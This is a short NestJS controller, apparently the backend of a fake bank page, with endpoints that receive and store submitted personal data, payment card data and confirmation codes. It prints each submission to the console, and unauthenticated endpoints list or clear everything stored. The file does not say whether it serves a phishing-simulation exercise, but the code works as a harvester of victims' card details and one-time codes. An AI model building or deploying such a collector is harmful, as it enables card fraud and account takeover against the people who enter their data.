import { Controller, Post, Body, Get, Delete } from '@nestjs/common';
import { FakeBankLogsService } from './fake-bank-logs.service';

@Controller('fake-bank-logs')
export class FakeBankLogsController {
  constructor(private readonly fakeBankLogsService: FakeBankLogsService) {}

  @Post('personal_data')
  async createPersonal(@Body() body: any) {
    console.log('[POST /fake-bank-logs/personal_data] New log received:', body);
    return this.fakeBankLogsService.create('personal_data', body);
  }

  @Post('card_data')
  async createCard(@Body() body: any) {
    console.log('[POST /fake-bank-logs/card_data] New log received:', body);
    return this.fakeBankLogsService.create('card_data', body);
  }

  @Post('confirmation_code')
  async createCode(@Body() body: any) {
    console.log(
      '[POST /fake-bank-logs/confirmation_code] New log received:',
      body,
    );
    return this.fakeBankLogsService.create('confirmation_code', body);
  }

  @Get()
  async findAll() {
    return this.fakeBankLogsService.findAll();
  }

  @Delete()
  async clear() {
    return this.fakeBankLogsService.clear();
  }
}
